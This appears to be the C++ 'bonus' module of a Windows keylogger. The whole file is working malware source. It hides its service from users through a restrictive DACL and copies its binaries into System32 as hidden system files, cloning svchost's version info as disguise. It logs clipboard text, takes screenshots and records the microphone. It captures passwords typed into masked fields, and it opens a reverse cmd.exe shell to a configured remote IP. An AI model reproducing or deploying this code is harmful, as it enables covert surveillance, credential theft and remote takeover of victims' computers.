#include <WS2tcpip.h>
#include <sddl.h>
#include <Windows.h>
#include <UIAutomation.h>

#include "bonus.hpp"

#include <array>
#include <ranges>

using namespace std::chrono_literals;

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Hide service and keylogger from their respective listing tools
═════════════════════════════════════════════════════════════════════ */

constexpr LPCSTR DACL_HIDE = "D:(D;;CCLCSWLO;;;IU)(A;;WDRC;;;BA)(A;;GA;;;SY)";
constexpr LPCSTR DACL_OPEN = "D:(A;;GA;;;BA)(A;;GA;;;SY)";

static void SetServiceAcl(LPCSTR sddl)
{
    const ScHandle scm(OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT));
    if (!scm) return (void)PrintLastError<0>("OpenSCManager");

    const ScHandle svc(OpenService(scm.get(), SERVICE_NAME, WRITE_DAC));
    if (!svc) return (void)PrintLastError<0>("OpenService(WRITE_DAC)");

    PSECURITY_DESCRIPTOR sd = nullptr;
    if (ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, SDDL_REVISION_1, &sd, nullptr)) {
        if (!SetServiceObjectSecurity(svc.get(), DACL_SECURITY_INFORMATION, sd)) {
            PrintLastError<0>("SetServiceObjectSecurity");
        }
        LocalFree(sd);
    }
}

void OpenDacl() { SetServiceAcl(DACL_OPEN); }

void HideDacl() { SetServiceAcl(DACL_HIDE); }

static void MirrorVersionInfo(const std::filesystem::path& src, const std::filesystem::path& dst)
{
    using Module = RAII<HMODULE, &FreeLibrary>;
    const Module hMod(LoadLibraryExW(src.c_str(), nullptr, LOAD_LIBRARY_AS_DATAFILE));
    if (!hMod) return (void)PrintLastError<0>("LoadLibraryEx");

    const HRSRC   hRes = FindResource(hMod.get(), MAKEINTRESOURCE(1), RT_VERSION);
    const HGLOBAL hMem = hRes ? LoadResource(hMod.get(), hRes) : nullptr;
    const DWORD   sz   = hMem ? SizeofResource(hMod.get(), hRes) : 0;
    const LPCVOID pBuf = hMem ? LockResource(hMem) : nullptr;
    if (!pBuf || !sz) return;

    HANDLE hUpd = BeginUpdateResourceW(dst.c_str(), FALSE);
    if (!hUpd) return (void)PrintLastError<0>("BeginUpdateResource");

    if (!UpdateResource(hUpd, RT_VERSION, MAKEINTRESOURCE(1), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), const_cast<void*>(pBuf), sz))
        PrintLastError<0>("UpdateResource");

    if (!EndUpdateResourceW(hUpd, FALSE)) PrintLastError<0>("EndUpdateResource");
}

static std::filesystem::path System32()
{
    WCHAR buf[MAX_PATH]{};
    GetSystemDirectoryW(buf, MAX_PATH);
    return buf;
}

static void HideFile(const std::filesystem::path& p)
{
    DWORD attr = GetFileAttributesW(p.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        PrintLastError<0>(std::format("GetFileAttributes {}", p.string()));
        return;
    }

    attr |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    if (!SetFileAttributesW(p.c_str(), attr)) {
        PrintLastError<0>(std::format("SetFileAttributes {}", p.string()));
    }
};

bool DeployHiddenCopy(std::filesystem::path& serviceExe)
{
    using namespace std::filesystem;
    std::error_code ec;

    const auto system32 = System32();
    const auto svchost  = JoinPath(system32, "svchost.exe");
    const auto exeDir   = GetExeDir();

    const auto svcSrc = JoinPath(exeDir, SERVICE_EXE);
    const auto svcDst = JoinPath(system32, HIDDEN_SERVICE_EXE);
    const auto klSrc  = JoinPath(exeDir, KEYLOGGER_EXE);
    const auto klDst  = JoinPath(system32, HIDDEN_KEYLOGGER_EXE);
    const auto iniSrc = JoinPath(exeDir, CONFIG_FILE);
    const auto iniDst = JoinPath(system32, CONFIG_FILE);

    const std::pair<path, path> files[] = {
        {svcSrc, svcDst},
        {klSrc, klDst},
        {iniSrc, iniDst},
    };

    for (const auto& [src, dst] : files) {
        if (exists(dst)) {
            SetFileAttributesW(dst.c_str(), FILE_ATTRIBUTE_NORMAL);
        }

        copy_file(src, dst, copy_options::overwrite_existing, ec);
        if (ec) {
            LogErr("Failed to copy {} to {}: {}", ToUtf8(src.c_str()), ToUtf8(dst.c_str()), ec.message());
            return false;
        }

        if (dst.extension().string() == ".exe") {
            MirrorVersionInfo(svchost, dst);
        }
        HideFile(dst);
    }

    serviceExe = svcDst;
    return true;
}

void DeleteHiddenCopy()
{
    std::error_code ec;
    const auto      system32 = System32();

    for (const auto& file : {HIDDEN_SERVICE_EXE, HIDDEN_KEYLOGGER_EXE, CONFIG_FILE}) {
        const auto full = JoinPath(system32, file);

        for (int i = 0; i < 10; ++i) {
            SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);

            remove(full, ec);
            if (!ec || ec.value() == ERROR_FILE_NOT_FOUND) break;

            ec.clear();
            std::this_thread::sleep_for(200ms);
        }

        if (ec) LogErr("Delete {} failed: {}", ToUtf8(full.c_str()), ec.message());
    }
}

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Clipboard, screen and microphone logging
═════════════════════════════════════════════════════════════════════ */

using ClipboardGuard = RAII<int, [](int) { CloseClipboard(); }>;
using HGlobalGuard   = RAII<HGLOBAL, &GlobalUnlock>;

void LogClipboardContent()
{
    if (!gConfig.ClipboardLogging || !OpenClipboard(nullptr)) return;

    ClipboardGuard cg{};
    if (HANDLE hData = GetClipboardData(CF_UNICODETEXT)) {
        WCHAR* wClipboard = static_cast<WCHAR*>(GlobalLock(hData));
        if (!wClipboard) return;
        HGlobalGuard hg(hData);
        if (*wClipboard) {
            auto clipboard = ToUtf8(wClipboard);
            if (!clipboard.empty()) {
                KeyLog("\n[Clipboard] {}\n", clipboard);
            }
        }
    }
}

using ScreenDCHandle = RAII<HDC, [](HDC handle) { ReleaseDC(nullptr, handle); }>;
using MemoryDCHandle = RAII<HDC, &DeleteDC>;
using BitmapHandle   = RAII<HBITMAP, &DeleteObject>;
using FileHandle     = RAII<HANDLE, &CloseHandle>;

void CaptureScreen(bool ignoreLastScreenshotTime)
{
    using namespace std::chrono;
    if (!gConfig.ScreenCapture) return;

    static auto lastScreenshotTime = steady_clock::now();
    if (!ignoreLastScreenshotTime && steady_clock::now() - lastScreenshotTime < gConfig.ScreenshotIntervalSec * 1s) {
        return;
    }
    
    lastScreenshotTime = steady_clock::now();

    auto screenWidth  = GetSystemMetrics(SM_CXSCREEN);
    auto screenHeight = GetSystemMetrics(SM_CYSCREEN);

    ScreenDCHandle dchScreen(GetDC(nullptr));
    if (!dchScreen.get()) return LogErr("Failed to get screen DC");
    MemoryDCHandle dchMemory(CreateCompatibleDC(dchScreen.get()));
    if (!dchMemory.get()) return LogErr("Failed to create compatible DC");
    BitmapHandle hBitmap(CreateCompatibleBitmap(dchScreen.get(), screenWidth, screenHeight));
    if (!hBitmap.get()) return LogErr("Failed to create compatible bitmap");

    SelectObject(dchMemory.get(), hBitmap.get());

    BitBlt(dchMemory.get(), 0, 0, screenWidth, screenHeight, dchScreen.get(), 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {.biSize = sizeof(bi), .biWidth = screenWidth, .biHeight = -screenHeight, .biPlanes = 1, .biBitCount = 32, .biCompression = BI_RGB};

    const auto bitmapSize = (screenWidth * bi.biBitCount + 31) / 32 * 4 * screenHeight;
    BITMAPFILEHEADER bmpf = {.bfType = 0x4D42, .bfSize = static_cast<DWORD>(sizeof(bmpf) + sizeof(bi) + bitmapSize), .bfOffBits = sizeof(bmpf) + sizeof(bi)};

    auto screenshotFilename = std::format("{}/screenshot{}.bmp", GetLogDir(), GetTimestamp<Filename>());

    FileHandle hFile(CreateFile(screenshotFilename.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr));
    if (hFile.get() == INVALID_HANDLE_VALUE) return;

    DWORD dwWritten = 0;
    WriteFile(hFile.get(), &bmpf, sizeof(bmpf), &dwWritten, nullptr);
    WriteFile(hFile.get(), &bi, sizeof(bi), &dwWritten, nullptr);

    std::vector<BYTE> buffer(static_cast<size_t>(bitmapSize));
    GetDIBits(dchMemory.get(), hBitmap.get(), 0, static_cast<UINT>(screenHeight), buffer.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
    WriteFile(hFile.get(), buffer.data(), static_cast<DWORD>(bitmapSize), &dwWritten, nullptr);
}

static void WriteWaveFile(const std::vector<BYTE>& buffer, const WAVEFORMATEX& wf)
{
    constexpr auto fmtBodySize    = 16u;   // sizeof(WAVEFORMATEX) - sizeof(wf.cbSize)
    constexpr auto riffHeaderSize = 4u +   // "WAVE"
                                    4u +   // "fmt "
                                    4u +   // sizeof(fmtBodySize)
                                    16u +  // fmtBodySize
                                    4u +   // "data"
                                    4u;    // sizeof(dataChunkSize)

    const auto dataChunkSize = static_cast<uint32_t>(buffer.size());
    const auto fileSize      = riffHeaderSize + dataChunkSize;

    const auto    recordingFilename = std::format("{}/mic_recording{}.wav", GetLogDir(), GetTimestamp<Filename>());
    std::ofstream out(recordingFilename, std::ios::binary);
    if (!out) return;

    auto writeRaw = [&](auto&&... value) { (out.write(reinterpret_cast<const char*>(&value), sizeof(value)), ...); };
    auto writeStr = [&](auto&&... str) { (out.write(str, sizeof(str) - 1), ...); };
    auto writeBuf = [&](const auto* data, size_t size) { out.write(reinterpret_cast<const char*>(data), static_cast<std::streamsize>(size)); };

    writeStr("RIFF");
    writeRaw(fileSize);
    writeStr("WAVE", "fmt ");
    writeRaw(fmtBodySize, wf.wFormatTag, wf.nChannels, wf.nSamplesPerSec, wf.nAvgBytesPerSec, wf.nBlockAlign, wf.wBitsPerSample);
    writeStr("data");
    writeRaw(dataChunkSize);
    writeBuf(buffer.data(), buffer.size());
}

using WaveInHandle = RAII<HWAVEIN, &waveInClose>;

void CaptureMicrophone(const std::stop_token& stopToken)
{
    constexpr WORD  nChannels      = 1;                              // Mono recording
    constexpr DWORD sampleRate     = 44100;                          // Standard sample rate
    constexpr WORD  bitsPerSample  = 16;                             // Standard bit depth
    constexpr WORD  blockAlign     = nChannels * bitsPerSample / 8;  // Block alignment in bytes
    constexpr DWORD avgBytesPerSec = sampleRate * blockAlign;        // Average bytes per second

    const DWORD recordMs = gConfig.MicrophoneDurationSec * 1000;
    const DWORD bufSize  = avgBytesPerSec * gConfig.MicrophoneDurationSec;

    constexpr WAVEFORMATEX wf = {.wFormatTag      = WAVE_FORMAT_PCM,
                                 .nChannels       = nChannels,
                                 .nSamplesPerSec  = sampleRate,
                                 .nAvgBytesPerSec = avgBytesPerSec,
                                 .nBlockAlign     = blockAlign,
                                 .wBitsPerSample  = bitsPerSample};

    auto check = [](MMRESULT status, const char* context) {
        if (status != MMSYSERR_NOERROR) {
            CHAR msg[256]{};
            waveInGetErrorTextA(status, msg, sizeof(msg));
            LogErr("{} failed: {}", context, msg);
            Sleep(1000);
            return false;
        }
        return true;
    };

    while (!stopToken.stop_requested()) {
        std::vector<BYTE> buffer(bufSize);
        WAVEHDR           hdr = {.lpData = reinterpret_cast<LPSTR>(buffer.data()), .dwBufferLength = bufSize};

        HWAVEIN hIn;
        if (!check(waveInOpen(&hIn, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL), "waveInOpen")) {
            continue;
        }
        WaveInHandle hInGuard(hIn);

        if (!check(waveInPrepareHeader(hIn, &hdr, sizeof(hdr)), "waveInPrepareHeader") ||
            !check(waveInAddBuffer(hIn, &hdr, sizeof(hdr)), "waveInAddBuffer") ||
            !check(waveInStart(hIn), "waveInStart")) {
            continue;
        }

        Sleep(recordMs);

        if (!check(waveInStop(hIn), "waveInStop") ||
            !check(waveInReset(hIn), "waveInReset") ||
            !check(waveInUnprepareHeader(hIn, &hdr, sizeof(hdr)), "waveInUnprepareHeader")) {
            continue;
        }

        WriteWaveFile(buffer, wf);
    }
}

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Capture password inputs behind masked controls
═════════════════════════════════════════════════════════════════════ */

static bool IsPasswordField()
{
    GUITHREADINFO gti{.cbSize = sizeof(gti)};
    if (GetGUIThreadInfo(0, &gti) && gti.hwndFocus) {
        const LONG_PTR style = GetWindowLongPtr(gti.hwndFocus, GWL_STYLE);
        if (style & ES_PASSWORD) return true;
    }

    static IUIAutomation* uia = []() -> IUIAutomation* {
        IUIAutomation* p = nullptr;
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        CoCreateInstance(__uuidof(CUIAutomation), nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&p));
        return p;
    }();

    if (!uia || !gti.hwndFocus) return false;

    IUIAutomationElement* el = nullptr;
    if (FAILED(uia->ElementFromHandle(gti.hwndFocus, &el)) || !el) return false;

    VARIANT    var{};
    const BOOL isPwd = SUCCEEDED(el->GetCurrentPropertyValue(UIA_IsPasswordPropertyId, &var)) && var.vt == VT_BOOL && var.boolVal == VARIANT_TRUE;

    VariantClear(&var);
    el->Release();
    return isPwd == TRUE;
}

bool HandlePasswordKey(DWORD vk, UINT sc)
{
    static bool        wasPwd = false;
    static std::string pwdBuf;

    const bool nowPwd = IsPasswordField();

    if (nowPwd) {
        if (!wasPwd) pwdBuf.clear();

        if (vk == VK_BACK) {
            if (!pwdBuf.empty()) pwdBuf.pop_back();
        } else {
            if (auto ch = TranslateKeyToUtf8(vk, sc); !ch.empty()) pwdBuf += ch;
        }
        wasPwd = true;
        return true;
    }

    if (wasPwd && !pwdBuf.empty()) {
        KeyLog("\n[Password] {}\n", pwdBuf);
        pwdBuf.clear();
    }
    wasPwd = false;
    return false;
}

/* ═════════════════════════════════════════════════════════════════════
   Bonus: Remote shell
═════════════════════════════════════════════════════════════════════ */

using Socket = RAII<SOCKET, &closesocket>;
using WSA    = RAII<int, [](int) { WSACleanup(); }>;

void LaunchRemoteShell(std::stop_token stopToken)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return LogErr("WSAStartup failed: {}", WSAGetLastError());
    }
    WSA wsaGuard{};

    SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (sock == INVALID_SOCKET) {
        return LogErr("WSASocketW failed: {}", WSAGetLastError());
    }
    Socket sockGuard(sock);

    if (SetHandleInformation(reinterpret_cast<HANDLE>(sock), HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT) == 0) {
        return LogErr("SetHandleInformation failed: {}", GetLastError());
    }

    sockaddr_in target{.sin_family = AF_INET, .sin_port = htons(gConfig.RemotePort)};
    if (inet_pton(AF_INET, gConfig.RemoteIp.c_str(), &target.sin_addr) != 1) {
        return LogErr("inet_pton failed: {}", WSAGetLastError());
    }

    if (WSAConnect(sock, reinterpret_cast<SOCKADDR*>(&target), sizeof(target), nullptr, nullptr, nullptr, nullptr) != 0) {
        return LogErr("WSAConnect failed: {}", WSAGetLastError());
    }

    HANDLE      hSocket = reinterpret_cast<HANDLE>(sock);
    STARTUPINFO si{.cb = sizeof(si), .dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW, .hStdInput = hSocket, .hStdOutput = hSocket, .hStdError = hSocket};

    ProcessInformation pi{new PROCESS_INFORMATION{}};
    CHAR               cmd[] = "cmd.exe";

    BOOL ret = CreateProcess(nullptr, cmd, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, pi.get());
    SetHandleInformation(reinterpret_cast<HANDLE>(sock), HANDLE_FLAG_INHERIT, 0);
    if (!ret) return (void)PrintLastError<0>("CreateProcess");
    
    while (WaitForSingleObject(pi.get()->hProcess, 500) == WAIT_TIMEOUT) {
        if (stopToken.stop_requested()) {
            TerminateProcess(pi.get()->hProcess, 0);
            break;
        }
    }
}
